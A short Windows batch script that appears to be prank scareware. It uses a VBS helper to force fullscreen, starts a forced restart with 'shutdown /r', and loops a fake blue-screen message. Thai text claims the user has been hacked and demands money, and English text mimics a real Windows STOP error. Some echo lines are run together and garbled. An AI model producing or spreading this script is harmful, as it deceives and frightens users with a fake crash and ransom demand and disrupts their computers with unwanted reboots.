@ECHO OFF

:VBSDynamicBuild
SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

:a
cls
shutdown /r
color 17








echo          พบปัญหาเกี่ยวกับคอมของคุณ

echo          คุณถูกเเฮ็กโดย น็อต.

echo.

echo          เเต่คุณได้รับ: DUPED RAINBOW TITANIC NOT.

echo.

echo          หน้าต่างล้มเหลว.

echo.

echo          หากนี่เป็นครั้งเเรกของคุณ

echo          ส่งเงินเป็นจำนวน 2กีบถ้วนไปให้เจ้า.

echo          ตามนี้

echo. 

echo          EZ.EZ.EZ.EZ.EZ.EZ

echo          KAI.KAI.KAI.KAI

echo.
 
echo          If problems continue, disable or remove any newly installed hardware

echo          or software. Disable BIOS memory options such as caching or shadowing.

echo          If you need to use Safe Mode to remove or disable components, restartecho your computer, press F8 to select Advanced Startup Options, and thenecho select Safe Mode.

echo.

echo          Technical information:

echo.
echo          *** STOP: 0x00000050 (0xFD3094C2,0x00000001,0xFBFE7617,0x00000000)echo.echo.echo *** SPCMDCON.SYS - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c
pause >nul
goto :a